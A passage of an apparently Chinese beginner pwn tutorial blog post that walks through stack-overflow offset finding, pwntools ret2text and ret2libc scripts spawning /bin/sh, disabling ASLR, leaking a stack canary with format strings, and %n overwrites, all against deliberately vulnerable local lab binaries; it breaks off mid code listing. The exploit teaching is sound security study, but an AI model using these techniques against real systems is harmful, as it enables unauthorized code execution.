+<p>计算偏移量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q 0Ab1</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali430:~/exp# msf-pattern_offset -q 0Ab1</span><br><span class="line">[*] Exact match at offset 33</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/08/pwn入门学习/offset1.png" alt></p>
+<h3 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h3><p>peda里执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pattern_create 100</span><br><span class="line">r</span><br><span class="line">pattern_offset A)AA</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 100</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /root/exp/3.exe </span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</span><br><span class="line">the str is:AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA��</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x41 (&apos;A&apos;)</span><br><span class="line">EBX: 0x44414128 (&apos;(AAD&apos;)</span><br><span class="line">ECX: 0x7fffffbf </span><br><span class="line">EDX: 0xf7faa010 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fa8000 --&gt; 0x1d6d6c </span><br><span class="line">EDI: 0xf7fa8000 --&gt; 0x1d6d6c </span><br><span class="line">EBP: 0x413b4141 (&apos;AA;A&apos;)</span><br><span class="line">ESP: 0xffffd2a0 (&quot;EAAaAA0AAFAAbA\336\367\001&quot;)</span><br><span class="line">EIP: 0x41412941 (&apos;A)AA&apos;)</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41412941</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd2a0 (&quot;EAAaAA0AAFAAbA\336\367\001&quot;)</span><br><span class="line">0004| 0xffffd2a4 (&quot;AA0AAFAAbA\336\367\001&quot;)</span><br><span class="line">0008| 0xffffd2a8 (&quot;AFAAbA\336\367\001&quot;)</span><br><span class="line">0012| 0xffffd2ac --&gt; 0xf7de4162 --&gt; 0x67736d (&apos;msg&apos;)</span><br><span class="line">0016| 0xffffd2b0 --&gt; 0x1 </span><br><span class="line">0020| 0xffffd2b4 --&gt; 0xffffd344 --&gt; 0xffffd4e2 (&quot;/root/exp/3.exe&quot;)</span><br><span class="line">0024| 0xffffd2b8 --&gt; 0xffffd34c --&gt; 0xffffd4f2 (&quot;SHELL=/bin/bash&quot;)</span><br><span class="line">0028| 0xffffd2bc --&gt; 0xffffd2d4 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41412941 in ?? ()</span><br><span class="line">gdb-peda$ A1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</span><br><span class="line">Undefined command: &quot;A1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;.  Try &quot;help&quot;.</span><br><span class="line">gdb-peda$ pattern_offset A)AA</span><br><span class="line">A)AA found at offset: 32</span><br></pre></td></tr></table></figure>
+<h3 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cyclic 100</span><br><span class="line">r</span><br><span class="line">cyclic -l iaaa</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/08/pwn入门学习/溢出点2.png" alt></p>
+<h2 id="python加载"><a href="#python加载" class="headerlink" title="python加载"></a>python加载</h2><h3 id="定位到exploit函数"><a href="#定位到exploit函数" class="headerlink" title="定位到exploit函数"></a>定位到exploit函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./3.exe&apos;)</span><br><span class="line">offset = 32</span><br><span class="line">payload =&apos;a&apos;*offset+p32(0x8049182)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 3.py</span><br></pre></td></tr></table></figure>
+<h3 id="定位到system函数的物理地址"><a href="#定位到system函数的物理地址" class="headerlink" title="定位到system函数的物理地址"></a>定位到system函数的物理地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p system</span><br><span class="line">$1 = &#123;int (const char *)&#125; 0xf7e13660 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>
+<p>libc中的system函数为真实物理地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ searchmem system</span><br><span class="line">Searching for &apos;system&apos; in: None ranges</span><br><span class="line">Found 19 results, display max 19 items:</span><br><span class="line">  test.exe : 0x804828b (&quot;system&quot;)</span><br><span class="line">      libc : 0xf7de58d1 (&quot;systemerr&quot;)</span><br><span class="line">      libc : 0xf7de5ba6 (&quot;system&quot;)</span><br><span class="line">      libc : 0xf7f505d9 (&quot;system error&quot;)</span><br><span class="line">      libc : 0xf7f511e6 (&quot;system call&quot;)</span><br><span class="line">      libc : 0xf7f5134e (&quot;system&quot;)</span><br><span class="line">      libc : 0xf7f513bb (&quot;system&quot;)</span><br><span class="line">      libc : 0xf7f51c11 (&quot;system call&quot;)</span><br><span class="line">      libc : 0xf7f51fdc (&quot;system bytes     = %10u\n&quot;)</span><br><span class="line">      libc : 0xf7f529dd (&quot;system/cpu&quot;)</span><br><span class="line">      libc : 0xf7f54f80 (&quot;system call should be restarted&quot;)</span><br><span class="line">      libc : 0xf7f554f6 (&quot;system type=\&quot;current\&quot; size=\&quot;%zu\&quot;/&gt;\n&lt;system type=\&quot;max\&quot; size=\&quot;%zu\&quot;/&gt;\n&quot;)</span><br><span class="line">      libc : 0xf7f5551a (&quot;system type=\&quot;max\&quot; size=\&quot;%zu\&quot;/&gt;\n&quot;)</span><br><span class="line">      libc : 0xf7f55678 (&quot;system type=\&quot;current\&quot; size=\&quot;%zu\&quot;/&gt;\n&lt;system type=\&quot;max\&quot; size=\&quot;%zu\&quot;/&gt;\n&lt;aspace type=\&quot;total\&quot; size=\&quot;%zu\&quot;/&gt;\n&lt;aspace type=\&quot;mprotect\&quot; size=\&quot;%zu\&quot;/&gt;\n&lt;/malloc&gt;\n&quot;)</span><br><span class="line">      libc : 0xf7f5569c (&quot;system type=\&quot;max\&quot; size=\&quot;%zu\&quot;/&gt;\n&lt;aspace type=\&quot;total\&quot; size=\&quot;%zu\&quot;/&gt;\n&lt;aspace type=\&quot;mprotect\&quot; size=\&quot;%zu\&quot;/&gt;\n&lt;/malloc&gt;\n&quot;)</span><br><span class="line">      libc : 0xf7f56f11 (&quot;system/cpu/online&quot;)</span><br><span class="line">      libc : 0xf7f5750e (&quot;system call failed\n&quot;)</span><br><span class="line">ld-2.29.so : 0xf7ff2991 (&quot;system search path&quot;)</span><br><span class="line">ld-2.29.so : 0xf7ff3aa0 (&quot;system&apos;s program\nloader to load the helper program from this file.  This helper program loads\nthe shared libraries needed by the program executable, prepares the program\nto run, and runs it.  You may &quot;...)</span><br></pre></td></tr></table></figure>
+<p>寻找”/bin/sh”参数地址：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> searchmem "/bin/sh"</span><br><span class="line">Searching for '/bin/sh' in: None ranges</span><br><span class="line">Found 3 results, display max 3 items:</span><br><span class="line">test.exe : 0x804a008 ("/bin/sh")</span><br><span class="line">test.exe : 0x804b008 ("/bin/sh")</span><br><span class="line">    libc : 0xf7f50f68 ("/bin/sh")</span><br></pre></td></tr></table></figure></p>
+<p>寻找返回地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p exit</span><br><span class="line">$2 = &#123;void (int)&#125; 0xf7e066f0 &lt;__GI_exit&gt;</span><br></pre></td></tr></table></figure></p>
+<p>注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
+<p>关闭系统地址随机化才能运行成功。</p>
+<p>python代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./test.exe&apos;)</span><br><span class="line">offset = 44</span><br><span class="line">payload =&apos;a&apos;*offset+p32(0xf7e13660)+p32(0xf7e066f0)+p32(0xf7f50f68)</span><br><span class="line"># 先压栈system物理地址，再压栈返回地址，再压栈&quot;/bin/sh&quot;参数地址</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="定位到system函数在函数领空的虚拟内存地址"><a href="#定位到system函数在函数领空的虚拟内存地址" class="headerlink" title="定位到system函数在函数领空的虚拟内存地址"></a>定位到system函数在函数领空的虚拟内存地址</h3><p>c程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">0x20</span>];</span><br><span class="line">	read(<span class="number">0</span>,str,<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	func();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o test.exe 4.c</span><br></pre></td></tr></table></figure>
+<p>寻找exploit函数入口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disass exploit</span><br></pre></td></tr></table></figure></p>
+<p>获得shell后返回地址就不重要了，可以随便写。参数可以是上面搜的”/bin/sh”任一地址</p>
+<p>python代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./test.exe'</span>)</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">payload =<span class="string">'a'</span>*offset+p32(<span class="number">0x8049040</span>)+p32(<span class="number">0x8049040</span>)+p32(<span class="number">0x804a008</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h1 id="格式化字符串与canary保护"><a href="#格式化字符串与canary保护" class="headerlink" title="格式化字符串与canary保护"></a>格式化字符串与canary保护</h1><p>格式化字符串漏洞是因为c语言中printf的参数个数不是确定的，参数的长度也不是确定的，当printf把输入当作第一个参数直接输出的时候，输入若干格式化字符串，会增加与格式化字符串相对应的参数，会泄露出栈中的内容</p>
+<h2 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h2><p>canary保护是指编译时在函数入口和出口处插入用于检测栈数据完整性的机器语言代码，属于编译器安全机制。</p>
+<p>gcc打开canary保护<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -fstack-protector -m32 -o test1.exe test1.c</span><br><span class="line">gdb test1.exe</span><br></pre></td></tr></table></figure></p>
+<p>在pwndbg里进行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i b</span><br><span class="line">No breakpoints or watchpoints.</span><br><span class="line">pwndbg&gt; b func</span><br><span class="line">Breakpoint 2 at 0x80491c1</span><br><span class="line">pwndbg&gt; i b</span><br><span class="line">Num     Type           Disp Enb Address    What</span><br><span class="line">2       breakpoint     keep y   0x080491c1 &lt;func+4&gt;</span><br></pre></td></tr></table></figure></p>
+<p>依次执行r和n指令，直到看到一行这样的指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x80491cf &lt;func+18&gt;    mov    eax, dword ptr gs:[0x14] &lt;0x804c000&gt;</span><br></pre></td></tr></table></figure></p>
+<p>每次运行时，%gs:20都会存入一个随机数，将随机值添加到栈的最后。后面再将栈的最后一个值与%gs:20进行对比，一致则进行跳转，否则终止代码。<br><img src="/2020/04/08/pwn入门学习/canary.png" alt><br><img src="/2020/04/08/pwn入门学习/canary2.jpg" alt><br>查看内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/x 0x804c000</span><br><span class="line">0x804c000:	0x0804bf14</span><br></pre></td></tr></table></figure></p>
+<p>即插入的canary随机代码。查看canary：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; canary</span><br><span class="line">AT_RANDOM = 0xffffd4bb # points to (not masked) global canary value</span><br><span class="line">Canary    = 0xe1ab7500</span><br><span class="line">Found valid canaries on the stacks:</span><br><span class="line">00:0000│   0xffffd27c ◂— 0xe1ab7500</span><br></pre></td></tr></table></figure></p>
+<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>C程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str1[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,str1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,str1);</span><br><span class="line">	<span class="built_in">printf</span>(str1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	func();</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>明显的溢出漏洞：正常输入的话两个printf输出一样，但是超过<code>str1[10]</code>的空间的话就会覆盖返回地址。</p>
+<p><strong>格式化字符串</strong><br>输入<code>%x%x%x</code>的话，输出结果为：<br><img src="/2020/04/08/pwn入门学习/格式化字符串1.png" alt></p>
+<p>正常输出的话，堆栈中这样存储<br><img src="/2020/04/08/pwn入门学习/存储.png" alt></p>
+<p>在OD里观察到原因<br><img src="/2020/04/08/pwn入门学习/格式化字符串2.png" alt><br>把存储内容当作输入。</p>
+<p>printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。<br>所以尽管没有参数，上面的代码也会将format string 后面的内存储存的数据当做参数以16进制输出。这样就会造成内存泄露。</p>
+<h2 id="泄露任意地址的内存"><a href="#泄露任意地址的内存" class="headerlink" title="泄露任意地址的内存"></a>泄露任意地址的内存</h2><p>之前的方法还只是泄露栈上变量值，没法泄露变量的地址，但是如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设格式化字符串相对函数调用是第 k 个参数，那我们就可以通过如下方法来获取指定地址 addr 的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux下：</span><br><span class="line">addr%k$p</span><br></pre></td></tr></table></figure></p>
+<p>在Windows下把输入换成下面的字符串，确定格式化字符串是第几个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAA%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-</span><br></pre></td></tr></table></figure></p>
+<p>则输出为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AAAAA%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-</span><br><span class="line">AAAAA  19ff30-  4011d0-  2ea000-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-41414141-78382541-7838252d-7838252d-7838252d-7838252d-7838252d-7838252d-7838252d-</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/pwn入门学习/格式化字符串3.png" alt></p>
+<p><img src="/2020/04/08/pwn入门学习/格式化字符串4.png" alt></p>
+<p>输出的内容和前面的输入重复了，就说明可以确定是第几个参数。但是不排除栈上有些其他变量也是这个值，所以可以用一些其他的字符进行再次尝试。</p>
+<p>根据这个原理，切换到linux下进行测试。<br>注：<code>%&lt;number&gt;$x</code> 是直接读取从当前位置往下数第number个位置的参数，同样可以用在<code>$n，$d，$p</code>等等。</p>
+<p>所以思路是：读取到canary的值并加入到payload中，在canary的地址放入原来canary的值。</p>
+<p>在进行到read函数时，查看栈：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack 20</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/pwn入门学习/canary_stack.png" alt><br>可以看到偏移为0x2c即44,4位一组偏移为11个内存单元。<br>输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%11$8x</span><br></pre></td></tr></table></figure></p>
+<p>一直n下去直到printf函数：<br><img src="/2020/04/08/pwn入门学习/canary1.png" alt><br>获得了canary的值，并以16进制形式输出。</p>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./test.exe"</span>)</span><br><span class="line">p.sendline(<span class="string">"%11$08x"</span>)</span><br><span class="line">canary=p.recv()[:<span class="number">8</span>]</span><br><span class="line">print(canary)</span><br><span class="line"></span><br><span class="line">canary=canary.decode(<span class="string">"hex"</span>)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">coffset=<span class="number">4</span>*<span class="number">4</span></span><br><span class="line">roffset=<span class="number">3</span>*<span class="number">4</span></span><br><span class="line">raddr=p32(<span class="number">0x8049192</span>)</span><br><span class="line">payload=coffset*<span class="string">'a'</span>+canary+roffset*<span class="string">'a'</span>+raddr</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/pwn入门学习/canary_python.png" alt></p>
+<h2 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h2><blockquote>
+<p>%n与其他格式说明符号不同。%n不向printf传递格式化信息，而是令printf把自己到该点已打出的字符总数放到相应变元指向的整形变量中。因此%n对于抄的变元必须是整形指针。<br>对printf调用返回之后，%n对于变元指向的变量中将包含有一个整数值，表示出现%n时已经由该次printf调用输出的字符数。<br>printf(“this%n is a test\n”,&amp;count);//调用后count为4</p>
+</blockquote>
+<p>C语言代码：<br>（和攻防世界pwn新手区第一题hello_pwn类似）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>希望通过改变C的值输出<code>modified c.</code>。而%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。只要变量对应的地址可写，就可以利用格式化字符串来改变其对应的值。</p>
+<p>步骤：<br>1.确定覆盖地址<br>2.确定偏移大小<br>3.覆盖</p>
+<p><img src="/2020/04/08/pwn入门学习/确定偏移.png" alt><br>可更改内存单元是第6个参数所在，而输出c的地址（4位）后，还需要12位才凑够16。故payload构成为：addr_c+’a’* 12+’%6$n’</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./string1'</span>)</span><br><span class="line"></span><br><span class="line">addr_c = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr_c)</span><br><span class="line">payload = p32(addr_c)+<span class="string">'a'</span>*<span class="number">12</span>+<span class="string">'%6$n'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里，recvuntil是接收输出直到’\n’为止，<code>drop=True</code>是指丢弃掉最后until的’\n’字符。就接收到了c的地址。</p>
+<p>但是这样的payload有个问题，把4字或8字的地址放在前面，所以覆盖字节至少也比4大。</p>
+<p>C语言代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span 